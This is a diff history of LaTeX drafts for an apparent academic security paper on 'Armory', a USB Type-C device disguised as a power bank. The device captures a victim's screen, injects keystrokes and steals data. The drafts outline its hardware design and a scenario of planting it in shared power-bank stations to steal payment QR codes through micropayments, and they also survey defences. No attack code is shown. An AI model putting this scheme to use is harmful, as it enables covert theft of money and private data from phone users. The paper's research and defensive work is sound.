 \yechang{hyperlink to OCR?}
@@
 extracting the victim's payment information when victim is using bank apps or payment apps.
-Besides, Armory can use ``opencv'' to detect and decode QR codes or barcodes shown on the victim's device, which is expected to extract payment code information in payment apps.
+Besides, \tool can use ``opencv'' to detect and decode QR codes or barcodes shown on the victim's device, which is expected to extract payment code information in payment apps.
 Here is an example of extracting payment code with opencv library in listing~\ref{lst2:qr},
@@
 
-It is worth noting that Armory exposed only a type-c cable (from USB Type-C hub),
-and Armory will charge his or her device through this cable, which has no difference from ordinary powerbanks.
-Noticed the similarity between Armory and normal power bank, we conduct a case study on power bank sharing in order to find out the possibility of Armory being mixed into the circulation of shared power banks.
+It is worth noting that \tool exposed only a type-c cable (from USB Type-C hub),
+and \tool will charge his or her device through this cable, which has no difference from ordinary powerbanks.
+Noticed the similarity between \tool and normal power bank, we conduct a case study on power bank sharing in order to find out the possibility of \tool being mixed into the circulation of shared power banks.
 

### 2021-01-11 WOOT/Files/experiment.tex
Update comments

@@
 
+\shuqing{Experiment for devices and case study needed.}
 For the purpose evaluating effectiveness of \tool, we conduct experiments in three modes on devices with USB Type-C interface.

### 2021-01-11 WOOT/Files/countermeasure.tex
Update countermeasures

@@
 
-\textbf{External Hardware Authorization}
+\textbf{External Hardware Authorization.}
 One possible countermeasure is to introduce external hardware completing the authorization process.
@@
 
-\textbf{Detection Based on Processor Status}
-Proposed by Meng, JFCGuard\cite{MENG2018252} is a detection mechanism of Juice Filming attack.
+\textbf{Detection Based on Processor Status.}
+Proposed by Meng et al., JFCGuard\cite{MENG2018252} is a detection mechanism of Juice Filming attack.
 This is based on the fact that video output will increase the usage of both GPU/CPU.
@@
 
-\textbf{Distrust-by-Default}
+\textbf{Distrust-by-Default.}
 Most security issues of USB protocol is due to its \textit{trust-by-default} policy.

### 2021-01-11 WOOT/Files/countermeasure.tex
Add limitation

@@
 It is worth mentioning here that \textit{distrust-by-default} policy is not the same as GoodUSB\cite{tian2015defending}.
-The GoodUSB relies on the \textit{unauthorized} device to complete its own authorization, while in this strict policy, users have to use an \textit{authorized} device.
+GoodUSB relies on the \textit{unauthorized} device to complete its own authorization, while in this strict policy, users have to use an \textit{authorized} device.
 Though \textit{distrust-by-default} policy effectively prevents these attack, this also causes considerable inconvenience for users.

### 2021-01-11 WOOT/Files/discussion.tex
Update comments
Update countermeasures
Add limitation

@@
 \label{sec:discussion}
-\outline{Defenses}
+
+\subsection{Limitation}
+There exist multiple limitations of \tool.
+To begin with, \tool can only gain the information and control access of the host itself instead of external hardware.
+Consequently, as we introduced in the Section\ref{sec:countermeasures}, \tool can hardly bypass the defence approaches which use external hardware for authorization.
+Moreover, most of the devices will prompt users to give authentication to the USB devices or select one of the functional modes after they are plugged in.
+Though some of such prompts are not conspicuous for non-experts, especially when \tool is concealed within other functional hardware such as portable battery \shuqing{If there is experiment, add it here.}, the probability whether users could get aware that something unusual happens will increase with the existence these prompting messages.
+
+\subsection{Impact}

### 2021-01-12 WOOT/Files/related_work.tex
Add introduction

@@
 Software running on the host will exfiltrate data or receive commands via the RF interface in \cite{turnip} after modified the USB table with an additional RF transmitter.
-Due to the limitations of USB 2.0, it is impossible to handle the real-time screen information of the host, so only environment fitted commands or data will work in these scenarios.
+Due to the limitations of USB 2.0, it is impossible to handle the real-time screen information of the host, so only environment fitted commands will work in these scenarios.
 
@@
 
-Another kind of attacks for USB to exfiltrate data\cite{smartphone}\cite{poweremi} and \cite{usbdriver} is to eavesdrop signal to recovered the sensitive data at the physical layer.
-Even though the data, including the video data, could be recovered in this way, the attack for executing malicious code is difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.
+Another kind of attacks for USB \cite{JFC} is to automatically record phone-screen and monitor user's input based on  the Mobile High-Definition Link(MHL) standard.
+With this approach, it is able to successfully exfiltrate data without the permission on user's side.
+Due to the limitation of MHL standard, only data exfiltrating without other attack scropt works here, and an additional conversion tool is necessary.
+Others attacks for USB to exfiltrate data\cite{smartphone}\cite{poweremi} and \cite{usbdriver} are to eavesdrop signal to recovered the sensitive data at the physical layer.
+Even though the data, including the video data, could be recovered in this way, these attacks for executing malicious code is difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.
 
 Since USB 3.1 was introduced with USB Type-C in 2013, display port and HDMI connectors have been provided by USB Type-C, transformation for video streaming data is guaranteed with the other attacks, e.g., protocol masquerading,  protocol corruption and code injection.
-To our best knowledge, we are the first to combine the host interaction with attack based on USB.
-Based on USB Type-C, we design Armory, a multi-mode BadUSB device\chaozu{add armory description}
+This allows attacker to control users' devices with screen monitoring, attacks for interaction work here.
 

### 2021-01-12 WOOT/Files/experiment.tex
[experiment] case study of qr code payment

@@
 Remote control mode is ideal for the attacker to control the victim's devices and grab all information shown on the victim's devices.
-However, if the attacker wants to control with video stream indicated, it requires high power consumption to encode video streams and stable network connections.
+However, it needs user consent for the first time and requires high power consumption to encode video streams and stable network connections.
 In the real world, high power consumption will increase the posibilities of being noticed by the victim, and stable network connections is hardly guaranteed.
-
-\yechang{Unlock status is needed or not?}
-\hongyi{Needed}
 
@@
 
+\subsubsection{Case study of QR code payment}
+
+QR code payment is a payment method where payment is typically performed as the following steps:
+\ding{182} The payer opens the payment application on his/her mobile device, and present his/her payment QR code to the payee.
+This QR code is encoded with a globally unique ID to identify the payer's account.
+\ding{183} The payee scan the payment QR code presented by the payer. By presenting this QR code, the payer authorizes proceeding with the payment.
+\ding{184} An order generated by this scan is sent to the payment service provider. Then the payment service provider requests the payer to confirm the transaction.
+\ding{185} After confirmation, the payment service provider proceed with this transaction and return the payment result to both the payee and the payer.
+
+In the real-world, some payment service providers provide special rules for micropayments purchases.
+A micropayment is pre-determined by the payment service provider with thresholds in the user agreement.
+For example, WeChat Pay regards payments less than CNY \textyen 1000 as micropayments.
+Differing from a typical payment procedure, when micropayments are made, confirmations can be applied automatically without requiring the payer to take further action, which is often encouraged by the payment service provider.
+
+The payment QR code is associated with the payer's account.
+If a victim's payment code is leaked to an attacker, an attacker can use the victim's payment code to proceed with payments.
+Furthermore, the attacker can use several micropayments to steal money from the victim's account while leaving the victim unconscious.
+In summary, the payment QR code is highly sensitive on users' devices.
+
 \subsection{Attack scenario}
@@
 A malicious user is able to modify his/her rented power bank, return it to a power bank station as normal, and its next user will unknowingly connect to this malicious power bank, which endangers the privacy of user.
+
+\subsection{evaluation}
+
+\begin{table*}
+	\centering
+	\begin{tabular}{|c|c|c|c|c|}
+		\hline
+		Application Column  & Application & Private information leaked                       \\
+		\hline
+		Finance App         & Alipay      & Alipay account, personal assets(blance)          \\
+		\hline
+		Social  Finance App & WeChat      & WeChat account, blance, chat history             \\
+		\hline
+		Social App          & QQ          & QQ account, interpersonal nexus, chat history    \\
+		\hline
+		Social App          & Twitter     & Twitter account, interpersonal nexus             \\
+		\hline
+		Social App          & Gmail       & Gmail account, mail records                      \\
+		\hline
+		Finance App         & ICBC        & ICBC account, password, personal assets(blance)  \\
+		\hline
+		Finance App         & Paypal      & Paypal account, blance, bank accounts            \\
+		\hline
+		Tool                & Chrome      & Sites visited                                    \\
+		\hline
+		Tool                & Health      & personal physical metrics      					 \\
+		\hline
+	\end{tabular}
+	\linebreak
+	\caption{Information extracted}
+	\label{table:information_extracted}
+\end{table*}

### 2021-01-13 WOOT/Files/experiment.tex
[experiment] revising case study

@@
 
-\subsubsection{Case study of QR code payment}
+\subsection{Case study}
+
+We conduct a case study with Power bank sharing and QR code payment as technical background.
+
+\subsubsection{Power bank sharing}
+
+Power bank sharing provides users with short term rental of power banks.
+A provider deploys power bank stations in the city.
+Then, users can rent a power bank from any of the power bank station, charge their device on the trip, return the rented power bank to another station, and pay rent online.
+
+As an example, Brick is such a power bank sharing service provider from Sweden.
+As Brick's website states, ``Brick prevents your electronics from running out of battery with powerbanks (Bricks) that you can easily rent \& return at our many stations in Stockholm, Gothenburg, Malmö and the rest of Sweden and even Europe.''.
+\yechang{citation needed}
+
+\yechang{add hyperlink or reference to Brick's website or Brick App on App Store/Google Play.}
+
+\yechang{Add more examples of power bank sharing to show that it is widely used?}
+
+Whiling providing convenience for users, it brings security issues.
+We notice that the power bank station does not check the integrity of power banks during the rental process, and users are hardly cautious when connecting their devices to the power bank.
+A malicious user is able to modify his/her rented power bank, return it to a power bank station as normal, and its next user will unknowingly connect to this malicious power bank, which endangers the privacy of user.
+
+\subsubsection{QR code payment}
 
@@
 
-\subsection{Attack scenario}
+\subsubsection{Attack scenario}
 
@@
 and \tool will charge his or her device through this cable, which has no difference from ordinary powerbanks.
-Noticed the similarity between \tool and normal power bank, we conduct a case study on power bank sharing in order to find out the possibility of \tool being mixed into the circulation of shared power banks.
-
-\subsubsection{Case study of Power Bank Sharing}
-
-Power bank sharing provides users with short term rental of power banks.
-A provider deploys power bank stations in the city.
-Then, users can rent a power bank from any of the power bank station, charge their device on the trip, return the rented power bank to another station, and pay rent online.
-
-As an example, Brick is such a power bank sharing service provider from Sweden.
-As Brick's website states, ``Brick prevents your electronics from running out of battery with powerbanks (Bricks) that you can easily rent \& return at our many stations in Stockholm, Gothenburg, Malmö and the rest of Sweden and even Europe.''.
-\yechang{citation needed}
-
-\yechang{add hyperlink or reference to Brick's website or Brick App on App Store/Google Play.}
-
-\yechang{Add more examples of power bank sharing to show that it is widely used?}
-
-Whiling providing convenience for users, it brings security issues.
-We notice that the power bank station does not check the integrity of power banks during the rental process, and users are hardly cautious when connecting their devices to the power bank.
-A malicious user is able to modify his/her rented power bank, return it to a power bank station as normal, and its next user will unknowingly connect to this malicious power bank, which endangers the privacy of user.
+Noticed the low users' vigilance and high similarity between \tool and normal power bank, the attacker can return his/her modified power bank (as \tool) to a power bank station, mixing \tool into the circulation of shared power banks.
+The next user unconsciously connect his/her device to \tool.
+He/She can find his/her devices being charged as normal.
+Like many outdoor mobile phone usage scenarios, the victim may complete payment with showing payment code.
+In this process, the attacker can preemptively extract and use the victim's payment code to make another payment.
+\yechang{tired, go to bed}
 

### 2021-01-13 WOOT/Files/related_work.tex
add related-defence

@@
 \subsection{USB Defence Security}
+There are already some defense measures against BadUSB attacks. 
+And there has been a comprehensive investigation of previous work.\cite{sok}.
+BadUSB attack requires `D-' and `D+' which have been defined by USB protocol since USB 1.0\cite{usb10},
+without these special pins, data can't be transferred in the USB cable.
+USB condom \cite{Condom} proposed a hardware-based solution to prevent data from being transmitted on data channel by adding special hardware between the usb device and host.
+However, this method poses a great challenge to ease of use, and once deployed, it will block all USB-supported advanced functions other than charging.
+Pham et al.
+\cite{pham2010optimizing}, Metascan \cite{OPSWAT} and odix\cite{OLEA} provide scanning function for files on portable USB devices, and can prevent malicious code from BadUSB devices from attacking host.
+There are also some work like TMSUI\cite{yang2015tmsui} USB
+Unix Smart Blocker\cite{diwan2014complete}, which based on the unreliable information provided during USB device enumeration to defend against BadUSB.
 
-There are already some defense measures against USB attacks.
 Since USB devices may hide their real functionality from the user.
 GoodUSB\cite{tian2015defending} will report the functionality and identity information of the device to the user before the enumeration is completed.
-The user needs to explicitly specify the useful functionality of the device.
+The user needs to explicitly specify the target functionality of the device.
 On this basis, GoodUSB loads the corresponding driver for the device, and device can not request other drivers during enumeration or usage.
@@
 For example, a malicious keyboard can type commands without the user's knowledge after enumeration.
-What's more, in GoodUSB, VM is deployed in host to interact with the USB device to detect malicious behavior like automatic execution of malicious code.
+Because from the user's perspect, he must permit a USB-based keyboard the corresponding drivers to allow users to use keyboard to type, but once the drivers are loaded, the malicious usb-based keyboard may also automatically type commands.
+What's more, in GoodUSB, VM is deployed in host to interact with the USB device to detect malicious behavior like automatic eqxecution of malicious code.
 
-IMonitor EAM\cite{IMonitor}\hongyi{Citation has compilation problem, plz recheck} maintain a whitelist of USB devices, only if one USB device is in the whitelist can it interact with host.
+Windows Defender ATP\cite{windenfenderwhite} can maintain a white list of USB devices, user can  only if one USB device is in the white list can it interact with host.
 This prevents all interactions between untrusted devices and the host.
@@
 For example, a naive user may add the USB device he found outdoors to his whitelist without precautions.
+Mohammadmoradi et al\cite{mohammadmoradi2018making} generate unique fingerprint based on the features and functions of the USB device, thereby building a whitelist of USB devices.
 
-Google\cite{Googleukip} has developed a security tool for Linux systems that can prevent USB key injection attacks from malicious U disk devices by identifying suspicious keystroke speeds.
+Neuner et al.\cite{neuner2018usblock} prevent USB key injection attacks from malicious U disk devices by analyze temporal characteristics of BadUSB-like attacks.
 This defense mechanism can be successful because the attacker cannot obtain the screen of the host based on the BadUSB under USB2.0, and can only inject instructions in a very short time to prevent the user from discovering.
-This leads to a very short interval between key events.
+This causes the typing characteristics of BadUSB devices to be detected.
 
-Some composite anti-virus systems, like Metascan\cite{OPSWAT} can sanitize the malicious files in the device to containment of any malware.
+Some composite anti-virus systems, like Windows Defender ATP\cite{windenfender} and Metascan\cite{OPSWAT} can sanitize the malicious files in the device to containment of any malware.
 However, Metascan warned users to be wary of the device plugged into the computer, since there is currently no way to ensure absolutely security.

### 2021-01-13 WOOT/Files/background.tex
add impl part, todo: three mode
Add introduction

@@
 \label{sec:background}
+\shuqing{Maybe we could introduce HID devices somewhere.}
 \noindent\outline{USB Standard}\\
 We first introduce the development of USB specification and emphasize the key points adopted in our work.
+We also organized a brief timeline introducing key points of each protocol in Table~\ref{table:usb_timeline}.
 
@@
 As the USB-IF believes it is the duty of original equipment manufacturers (OEMs) to decide whether security features should be implemented.\hongyi{Citation needed}.
-But the divergent implementations give chance for attack like Rubber Ducky\cite{rubber} and our \tool.
+But the divergent implementations give a chance for attack like Rubber Ducky\cite{rubber} and our \tool.
+\begin{table*}
+\begin{tabular}{|c|c|c|c|c|}
+	\hline
+	Year & Protocol Version & Supported Peripherals & Transfer Speed & Attacks \\
+	\hline
+	1996 & USB 1.x & Keyboard, Mouse... & 1.5 Mbit/s or 12 Mbit/s & HID Emulating(BadUSB) \\
+	\hline
+	2000 & USB 2.0 & Flash Drive, High-Definition Link, CD Driver... & 480 Mbit/s & Autorun Attack, Juice Filming Attack \\
+	\hline
+	2008 & USB 3.0 & / & 5 Gbit/s & / \\
+	\hline
+	2013 & USB 3.1 & HDMI, DisplayPort, ThunderBolt... & 10 Gbit/s & Armory \\
+	\hline
+	2017 & USB 3.2 & / & 20 Gbit/s & / \\
+	\hline
+\end{tabular}
+	\linebreak
+\caption{USB Protocol Timeline}
+\label{table:usb_timeline}
+\end{table*}

### 2021-01-13 WOOT/Files/badusb.tex
Update comments

@@
 \label{sec:badusb}
+\subsection{Threat Model}
+We build our threat model on the basic assumptions that common users without technical background would not treat normal-looking USB device as highly dangerous and be cautious about them.
+These assumptions are approved in a relevant work about charging attack\cite{JFCImpact}.
+Moreover, we neglect the effect of notification about common USB device, as normal users usually are not equipped with the necessary knowledge to fully understand such notices.
+In fact, during our experiment, no device had security notifications raised about suspicious USB devices and only mobile devices had raised charging notification about our \tool, which is not a sufficient warning towards users.
+
+We also assume the victim's device is equipped with fully functional USB 3.x protocol and USB Type C connector.
+As the USB 3.x standard is more and more common around the world, this assumption can be easily fulfilled especially in recent devices.
 \subsection{Motivation}
@@
 
-\subsubsection{Hardware Specification}
-The hardware we use is as follows and the relation between them is illustrated at Fig.~\ref{fig:hardware_specification}
+\subsubsection{Attack Model}
+The components in our attack model are as follows and the relation between them is illustrated at Fig.~\ref{fig:attack_model}
 \begin{itemize}
@@
 	\item\textit{Video Capture Card} convert DisplayPort signal into UVC-compatible\hongyi{citation needed} data, which is later processed by Raspberry Pi.
-	\item\textit{Raspberry Pi} processes video stream from the victim where private data is extracted and transmitted through GSM/WiFi.
-	\item\textit{Rubber Ducky} emulates HID device which can be controlled from either the embedded Raspberry Pi or the attacker.
+	\item\textit{Single Board Computer} processes video stream from the victim where private data is extracted and transmitted through GSM/WiFi.
+	\item\textit{HID Emulator} emulates HID device which can be controlled from either the embedded Raspberry Pi or the attacker.
 \end{itemize}
 \begin{figure}[hbtp]
-	\includegraphics[width=\linewidth]{./Figs/hardware_specification.png}
-	\caption{Hardware Specification}
-	\label{fig:hardware_specification}
+	\includegraphics[width=\linewidth]{./Figs/attack_model.png}
+	\caption{Attack Model}
+	\label{fig:attack_model}
 \end{figure}
@@
 Moreover, this mode provides a backdoor that does not require host network and thus is undetectable by firewall running on the host machine.
-\hongyi{I think this is a quite good selling point?}
+\hongyi{I think this is a quite good selling point?}\shuqing{Agree with Hongyi.}
 

### 2021-01-17 WOOT/Files/background.tex
Add bg about HID, add fig of connector standard

@@
 
+\noindent\outline{HID Protocol}\\
+Right after one year of the appearance of USB 1.0, a standard named HID (\emph{Human Interface Device})\hongyi{Citation Needed} was born on the basis of USB.
+HID is designed with the goal of unifying the implementation for devices like mouse, keyboard and so on.
+Before its appearance, the standard is divided between manufacturers, for example, mouses of Company A may uses X-Y coordinates to represent its location while mouses of Company B uses relative displacement.
+This means every device needs their own drivers to work.
+After HID, people just write one driver for an entire class of HIDs.
+Furthermore, HID standard also requires all devices to be PnP (\emph{Plug-and-Play}), which is indeed convenient but very dangerous too.
+
 USB1.x\cite{usb10}\cite{usb11} provided two data transfer rates which are Low Speed (1.5 Mbit/s) and Full Speed (12 MBit/s).
@@
 Though various peripherals were supported in USB 2.0, there was no reliable way to identify the type of a device.
-This security flaw allowed attacks like Rubber Ducky\cite{rubber}.
+This security flaw allowed attacks like BadUSB\cite{rubber}.
 
@@
 
+\noindent\outline{Connector Standard}
+\begin{figure}[hbtp]
+	\includegraphics[width=\linewidth]{./Figs/usb_conn.png}
+	\caption{USB 1.x \& 2.x Connector}
+	\label{fig:usb_conn}
+\end{figure}
+As illustrated in Figure~\ref{fig:usb_conn}, the original USB 1.x \& 2.x connector only has two pins for data transferring (D+ \& D-), which has significantly limited data transfer rate (5 Gbits/s Max) and support for peripheral like DisplayPort (10.8 Gbit/s Min).
+Apart from that, support for other peripheral also requires dedicated transferring lane as their standards are not compatible with USB in most cases.
+\begin{figure}[hbtp]
+	\includegraphics[width=\linewidth]{./Figs/usb_c_conn.png}
+	\caption{USB Type C Connector}
+	\label{fig:usb_c_conn}
+\end{figure}
+
+Thus, in order to provide support towards a wider range of peripherals, a 24-pins standard called USB Type-C is introduced in 2013 by USB-IF.
+As it is designed to be double-sided, the number of actual usable pins is halved.
+Nevertheless, this standard has largely enhanced the capability of USB 3.x protocol.
+As presented in Figure~\ref{fig:usb_c_conn}, Type-C added two high speed data lanes (TRX1 \& TRX2) and kept the original data lane (D+ \& D-).
+The added lanes are used exclusively to support peripherals like DisplayPort while the kept data lane transfers USB packets.
+
 \noindent\outline{Security Problem}\\
@@
 As the USB-IF believes it is the duty of original equipment manufacturers (OEMs) to decide whether security features should be implemented.\hongyi{Citation needed}.
-But the divergent implementations give a chance for attack like Rubber Ducky\cite{rubber} and our \tool.
+But the divergent implementations give a chance for attack like BadUSB\cite{rubber} and our \tool.
+
 \begin{table*}

### 2021-01-17 WOOT/Files/countermeasure.tex
[countermeasure] a comment
add figures, add new counter measure

@@
 \section{Countermeasures}
+\yechang{Feng Liang says Andriod or iOS can provide an API to render private information only on onboard screen (like iPad OS)}
+
 \label{sec:countermeasures}
@@
 
-\textbf{Detection Based on Processor Status.}
-Proposed by Meng et al., JFCGuard\cite{MENG2018252} is a detection mechanism of Juice Filming attack.
-This is based on the fact that video output will increase the usage of both GPU/CPU.
-As both Juice Filming attack and our \tool  highly relies on the video stream hijacking.
-Thus, in a similar way, we can monitor the usage of processors and adapt a statistic model to tell whether the host device is under \tool attack.
-Comparing to the external hardware authorization plan, this does not require extra hardware and is more transparent to users.
-We have assessed this defense in Section~\ref{sec:experiment} and experiments proves this is a promising mechanism\hongyi{EXPERIMENT!!!!!!!!!!}.
+\textbf{Isolated UI Rendering}
+During our experiment, we noticed that \tool is actually unable to redirect out the locking screen keyboard from the iPad OS.
+Instead, the keyboard is only available on the internal display.
+However, this defense is only enabled on the locking screen keyboard, other virtual keyboard is still vulnerable to our \tool.
+This mechanism has inspired us to propose a new defense against our \tool.
+If the OS provider like Apple/Google can implement a more generalized \emph{isolated UI rendering} that allows developer to decide whether a content is ``sensitive'' and where it should be rendered.
+To better illustrate this countermeasure idea, we drew the Figure~\ref{fig:isolated_ui}.
+In that figure, the password keyboard is set to be ``sensitive'' component while the other parts of the UI is not.
+Thus the renderer will only render the password keyboard on the trusted internal display and prevent untrusted external display like \tool to obtain sensitive data.
+We believe this is a promising way to defend users from attack like juice filming and our \tool.
+\begin{figure}[htbp]
+	\includegraphics[width=\linewidth]{./Figs/isolated_ui.png}
+	\caption{Isolated UI Rendering}
+	\label{fig:isolated_ui}
+\end{figure}
 

### 2021-01-17 WOOT/Files/related_work.tex
add figures, add new counter measure

@@
 
-Neuner et al.\cite{neuner2018usblock} prevent USB key injection attacks from malicious U disk devices by analyze temporal characteristics of BadUSB-like attacks.
+Neuner et al.\cite{neuner2018usblock} prevent USB key injection attacks from malicious flash drive by analyze temporal characteristics of BadUSB-like attacks.
 This defense mechanism can be successful because the attacker cannot obtain the screen of the host based on the BadUSB under USB2.0, and can only inject instructions in a very short time to prevent the user from discovering.

### 2021-01-18 WOOT/Files/related_work.tex
wuhu

@@
 \subsection{USB Defence Security}
-There are already some defense measures against BadUSB attacks. 
+There are already some defenses against BadUSB attacks. 
 And there has been a comprehensive investigation of previous work.\cite{sok}.
@@
 USB condom \cite{Condom} proposed a hardware-based solution to prevent data from being transmitted on data channel by adding special hardware between the usb device and host.
+At this case, `D-' and `D+' are disabled.
 However, this method poses a great challenge to ease of use, and once deployed, it will block all USB-supported advanced functions other than charging.
 Pham et al.
-\cite{pham2010optimizing}, Metascan \cite{OPSWAT} and odix\cite{OLEA} provide scanning function for files on portable USB devices, and can prevent malicious code from BadUSB devices from attacking host.
+\cite{pham2010optimizing}, Metascan \cite{OPSWAT} and odix\cite{OLEA} propose scanning function for files on portable USB devices, and can prevent malicious code over malicious devices from attacking host.
 There are also some work like TMSUI\cite{yang2015tmsui} USB
-Unix Smart Blocker\cite{diwan2014complete}, which based on the unreliable information provided during USB device enumeration to defend against BadUSB.
+Unix Smart Blocker\cite{diwan2014complete}, which based on the unreliable information provided by USB devices during enumeration to defend against BadUSB attack.
 
 Since USB devices may hide their real functionality from the user.
-GoodUSB\cite{tian2015defending} will report the functionality and identity information of the device to the user before the enumeration is completed.
-The user needs to explicitly specify the target functionality of the device.
+GoodUSB\cite{tian2015defending} will report the functionality and identity information of the device to the user and the user needs to explicitly specify the target functionality of the device.
 On this basis, GoodUSB loads the corresponding driver for the device, and device can not request other drivers during enumeration or usage.
@@
 For example, a malicious keyboard can type commands without the user's knowledge after enumeration.
-Because from the user's perspect, he must permit a USB-based keyboard the corresponding drivers to allow users to use keyboard to type, but once the drivers are loaded, the malicious usb-based keyboard may also automatically type commands.
+Because from the user's perspect, he must permit a USB-based keyboard the corresponding drivers to allow himself to use keyboard to type, but once the drivers are loaded, the malicious usb-based keyboard can also automatically type commands.
 What's more, in GoodUSB, VM is deployed in host to interact with the USB device to detect malicious behavior like automatic eqxecution of malicious code.
 
-Windows Defender ATP\cite{windenfenderwhite} can maintain a white list of USB devices, user can  only if one USB device is in the white list can it interact with host.
+Windows Defender ATP\cite{windenfenderwhite} can maintain a white list of USB devices, only if one USB device is in the white list can it interact with host.
 This prevents all interactions between untrusted devices and the host.
@@
 Neuner et al.\cite{neuner2018usblock} prevent USB key injection attacks from malicious flash drive by analyze temporal characteristics of BadUSB-like attacks.
-This defense mechanism can be successful because the attacker cannot obtain the screen of the host based on the BadUSB under USB2.0, and can only inject instructions in a very short time to prevent the user from discovering.
+This defense mechanism can be successful because the attacker cannot obtain the screen of the host based on the BadUSB under USB2.0, so that the malicious device can only inject instructions in a very short time to prevent the user from discovering.
 This causes the typing characteristics of BadUSB devices to be detected.

### 2021-01-19 WOOT/Files/related_work.tex
related work add more works

--- 2021-01-17 WOOT/Files/related_work.tex
@@
 
-In this part, we survey related works on USB attack security in Section III-A, and USB defence security in Section III-B, respectively.
+In this part, we survey related works on USB attack in Section III-A, and USB defence security in Section III-B, respectively.
 
-\subsection{USB Attack Security}
+\subsection{USB Attack}
 While many USB based attacks have been developed, these attacks are all tied to the environment of the target devices.
 In addition, limited to the USB 2.0\cite{usb20} specification, there is no video transformation interface, the control of attack processing is impossibly handled by the attackers without additional processing signal received.
-When the  protocol masquerading attack devices, e.g., Rubbery Ducky\cite{rubber}, \cite{rubberducky2020} and USBderivery\cite{usbdriver}, are connected to the host, they will hide their own functionality with the re-write functionality interface, that works because of the HID enumeration property for USB identifying.
+One way is to masquerade protocol of attack devices, e.g., Rubbery Ducky\cite{rubber},\cite{badusb}, \cite{rubberducky2020}, \cite{usbbypassing}, \cite{iseeyou}and USBderivery\cite{usbdriver}, when they are connected to the host, they will hide their own functionality with the re-write functionality interface, that works because of the HID enumeration property for USB identifying.
 Software running on the host will exfiltrate data or receive commands via the RF interface in \cite{turnip} after modified the USB table with an additional RF transmitter.
-Due to the limitations of USB 2.0, it is impossible to handle the real-time screen information of the host, so only environment fitted commands will work in these scenarios.
+What is more, the host's USB software stack generally expects devices to confirm the USB standard, \cite{facedancer} and \cite{syzkaller} take a number of vulnerabilities to the kernel-model with the help of fuzzing technology.
+These attacks are all using the vulnerabilities of the protocol of USB, but due to the limitations of USB 2.0, there are no port for video transformation in the devices with USB 2.0, so it is impossible to handle the real-time screen information of the host, only environment fitted commands and scripts will work in these scenarios, as well as the attack time.
 
-In a similar way, \cite{duqu} used a user-mode rootkit to hide malicious files on the USB storage device, zero-day exploits is also developed in \cite{zero-day} to automatically execute malware when the storage devices are connected to the host.
+In a similar way, \cite{duqu} used a user-mode rootkit to hide malicious files on the USB storage device, zero-day exploits is also developed in \cite{zero-day} to automatically execute malware when the storage devices are connected to the host, \cite{brain}, \cite{stuxnet}, \cite{conficker} and \cite{flame} also attack with code injection.
+\cite{webcam}, \cite{malware},\cite{audioextraction}, \cite{usbee}, and \cite{turnip} used the property that USB devices often do not authenticate the communicating application on the host, they send or receive sensitive data to or from the host devices.
 Due to the limitation of functionality interface of devices for video transformation, the accuracy timing for wake up the devices is difficult to handle, e.g., executing the malicious code in host's free time, pause the execution processing in the inappropriate time.
@@
 With this approach, it is able to successfully exfiltrate data without the permission on user's side.
-Due to the limitation of MHL standard, only data exfiltrating without other attack scropt works here, and an additional conversion tool is necessary.
-Others attacks for USB to exfiltrate data\cite{smartphone}\cite{poweremi} and \cite{usbdriver} are to eavesdrop signal to recovered the sensitive data at the physical layer.
+Due to the limitation of MHL standard, only data exfiltrating without other attack script works here, an additional conversion tool is necessary.
+Others attacks for USB to exfiltrate data\cite{smartphone}, \cite{poweremi},\cite{revealing}, \cite{su2017usb}, \cite{usbgpslocator}, \cite{bates2014leveraging}, \cite{badusbhub}, \cite{usbfinger}, \cite{side}, \cite{usbdriver} are to eavesdrop signal to recovered the sensitive data at the physical layer.
+In a similar way, \cite{usbkiller}, \cite{cable}, \cite{usbee}, \cite{turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
 Even though the data, including the video data, could be recovered in this way, these attacks for executing malicious code is difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.
@@
 \subsection{USB Defence Security}
-There are already some defense measures against BadUSB attacks. 
-And there has been a comprehensive investigation of previous work.\cite{sok}.
-BadUSB attack requires `D-' and `D+' which have been defined by USB protocol since USB 1.0\cite{usb10},
-without these special pins, data can't be transferred in the USB cable.
-USB condom \cite{Condom} proposed a hardware-based solution to prevent data from being transmitted on data channel by adding special hardware between the usb device and host.
-However, this method poses a great challenge to ease of use, and once deployed, it will block all USB-supported advanced functions other than charging.
-Pham et al.
-\cite{pham2010optimizing}, Metascan \cite{OPSWAT} and odix\cite{OLEA} provide scanning function for files on portable USB devices, and can prevent malicious code from BadUSB devices from attacking host.
-There are also some work like TMSUI\cite{yang2015tmsui} USB
-Unix Smart Blocker\cite{diwan2014complete}, which based on the unreliable information provided during USB device enumeration to defend against BadUSB.
 
+There are already some defense measures against USB attacks.
 Since USB devices may hide their real functionality from the user.
 GoodUSB\cite{tian2015defending} will report the functionality and identity information of the device to the user before the enumeration is completed.
-The user needs to explicitly specify the target functionality of the device.
+The user needs to explicitly specify the useful functionality of the device.
 On this basis, GoodUSB loads the corresponding driver for the device, and device can not request other drivers during enumeration or usage.
@@
 For example, a malicious keyboard can type commands without the user's knowledge after enumeration.
-Because from the user's perspect, he must permit a USB-based keyboard the corresponding drivers to allow users to use keyboard to type, but once the drivers are loaded, the malicious usb-based keyboard may also automatically type commands.
-What's more, in GoodUSB, VM is deployed in host to interact with the USB device to detect malicious behavior like automatic eqxecution of malicious code.
+What's more, in GoodUSB, VM is deployed in host to interact with the USB device to detect malicious behavior like automatic execution of malicious code.
 
-Windows Defender ATP\cite{windenfenderwhite} can maintain a white list of USB devices, user can  only if one USB device is in the white list can it interact with host.
+IMonitor EAM\cite{IMonitor}\hongyi{Citation has compilation problem, plz recheck} maintain a whitelist of USB devices, only if one USB device is in the whitelist can it interact with host.
 This prevents all interactions between untrusted devices and the host.
@@
 For example, a naive user may add the USB device he found outdoors to his whitelist without precautions.
-Mohammadmoradi et al\cite{mohammadmoradi2018making} generate unique fingerprint based on the features and functions of the USB device, thereby building a whitelist of USB devices.
 
-Neuner et al.\cite{neuner2018usblock} prevent USB key injection attacks from malicious flash drive by analyze temporal characteristics of BadUSB-like attacks.
+Google\cite{Googleukip} has developed a security tool for Linux systems that can prevent USB key injection attacks from malicious U disk devices by identifying suspicious keystroke speeds.
 This defense mechanism can be successful because the attacker cannot obtain the screen of the host based on the BadUSB under USB2.0, and can only inject instructions in a very short time to prevent the user from discovering.
-This causes the typing characteristics of BadUSB devices to be detected.
+This leads to a very short interval between key events.
 
